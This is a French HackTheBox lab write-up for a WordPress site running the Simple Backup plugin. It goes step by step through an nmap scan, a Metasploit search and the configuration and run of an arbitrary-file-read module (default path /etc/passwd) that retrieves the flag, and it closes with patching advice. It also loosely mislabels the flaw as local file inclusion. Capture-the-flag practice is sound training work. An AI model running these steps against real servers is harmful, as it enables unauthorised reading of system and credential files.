# HTB Exploitation Basics - Writeup Complet

## Introduction

Ce writeup documente la r√©solution d'un challenge "Exploitation Basics" sur HackTheBox. L'objectif est d'identifier les services ex√©cut√©s sur un serveur cible, de trouver des exploits publics, puis d'exploiter une vuln√©rabilit√© pour r√©cup√©rer le flag.

**Cible :** `94.237.58.137:58854`  
**Temps limit√© :** 3 minutes

---

## √âtape 1 : Reconnaissance - Scan Nmap

La premi√®re √©tape consiste √† identifier les services en cours d'ex√©cution sur le serveur cible.

![Scan Nmap](image1)

**Commande ex√©cut√©e :**
```bash
nmap -sV -sC -p 58854 94.237.58.137
```

**R√©sultats du scan :**
- **Port :** 58854/tcp (HTTP)
- **Service :** Apache httpd 2.4.41 (Ubuntu)
- **Titre HTTP :** "Getting Started &#8211; Just another WordPress site"
- **Headers HTTP :**
  - Server: Apache/2.4.41 (Ubuntu)
  - Generator: WordPress 5.6.1

Le scan r√©v√®le un site WordPress version 5.6.1 h√©berg√© sur Apache.

---

## √âtape 2 : Identification de la cible WordPress

En acc√©dant au site web via le navigateur, nous confirmons la pr√©sence d'un site WordPress.

![Site WordPress](image2)

Le site affiche :
- **Titre :** "GETTING STARTED - Just another WordPress site"
- **Plugin identifi√© :** Simple Backup Plugin 2.7.10 for WordPress
- **Description :** Le plugin permet de sauvegarder et t√©l√©charger le site WordPress et la base de donn√©es MySQL. Les fichiers de backup sont stock√©s dans un r√©pertoire `simple-backup` √† la racine du site.

**Information cruciale :** La date de publication (11 f√©vrier 2021) et la version du plugin nous permettent de rechercher des vuln√©rabilit√©s connues.

---

## √âtape 3 : Recherche d'exploits avec Metasploit

Nous utilisons Metasploit Framework pour rechercher des exploits publics correspondant √† WordPress 2.7.10.

![Metasploit](image3)

**Commande :**
```bash
search exploit wordpress 2.7.10
```

**R√©sultat :**
```
Matching Modules
================

#  Name                                              Disclosure Date  Rank    Check  Description
-  ----                                              ---------------  ----    -----  -----------
0  auxiliary/scanner/http/wp_simple_backup_file_read .                normal  No     WordPress Simple Backup File Read Vulnerability
```

Un module auxiliaire a √©t√© trouv√© : `auxiliary/scanner/http/wp_simple_backup_file_read` permettant une lecture arbitraire de fichiers.

---

## √âtape 4 : Configuration du module d'exploitation

Nous chargeons le module et examinons ses options.

![Configuration Metasploit](image4)

**Commandes :**
```bash
use auxiliary/scanner/http/wp_simple_backup_file_read
show options
```

**Options du module :**
- **DEPTH :** 6 (profondeur de travers√©e pour atteindre le dossier racine)
- **FILEPATH :** /etc/passwd (chemin par d√©faut du fichier √† lire)
- **RHOST :** H√¥te cible
- **RPORT :** Port cible
- **TARGETURI :** / (chemin de base vers l'application WordPress)

---

## √âtape 5 : Configuration des param√®tres d'attaque

Nous configurons le module avec les informations de notre cible pour lire le fichier `/flag.txt`.

![Param√®tres configur√©s](image5)

**Configuration effectu√©e :**
```bash
set FILEPATH /flag.txt
set RHOSTS 94.237.58.137
set RPORT 58854
set TARGETURI /
```

Les param√®tres sont maintenant correctement configur√©s pour cibler notre serveur et tenter de lire le fichier flag.

---

## √âtape 6 : Ex√©cution de l'exploit

Nous lan√ßons l'exploitation pour r√©cup√©rer le contenu du fichier `/flag.txt`.

![Exploitation](image6)

**Commande :**
```bash
run
```

Le module exploite la vuln√©rabilit√© de lecture de fichiers arbitraires dans le plugin Simple Backup. Le fichier est t√©l√©charg√© et enregistr√© localement.

**R√©sultat :**
```
$cat /home/j3dus0r/.msf4/loot/20251121125745_default_94.237.58.137_simplebackup.tra_424165.txt
HTB{my_f1!57_h4ck}
```

---

## √âtape 7 : Validation du flag

Le contenu du fichier r√©cup√©r√© contient le flag recherch√©.

![Flag r√©cup√©r√©](image7)

**Flag obtenu :** `HTB{my_f1!57_h4ck}`

Nous soumettons ce flag dans l'interface du challenge pour valider la r√©solution.

![Soumission du flag](image8)

---

## Conclusion

Ce challenge d√©montre l'importance de :
1. **La reconnaissance** : Identifier les services et versions en cours d'ex√©cution
2. **La recherche de vuln√©rabilit√©s** : Utiliser des bases de donn√©es d'exploits (Metasploit, ExploitDB)
3. **L'exploitation** : Configurer et ex√©cuter correctement les exploits
4. **La persistance** : Lire les fichiers sensibles pour atteindre l'objectif

La vuln√©rabilit√© exploit√©e (Local File Inclusion via le plugin Simple Backup) permet de lire des fichiers arbitraires sur le serveur, ce qui repr√©sente un risque de s√©curit√© majeur.

**Recommandations de s√©curit√© :**
- Maintenir WordPress et ses plugins √† jour
- Limiter les permissions des r√©pertoires de backup
- D√©sactiver les plugins non utilis√©s ou vuln√©rables
- Impl√©menter une validation stricte des entr√©es utilisateur

---

**Challenge r√©ussi !** üéâ

Flag final : `HTB{my_f1!57_h4ck}`
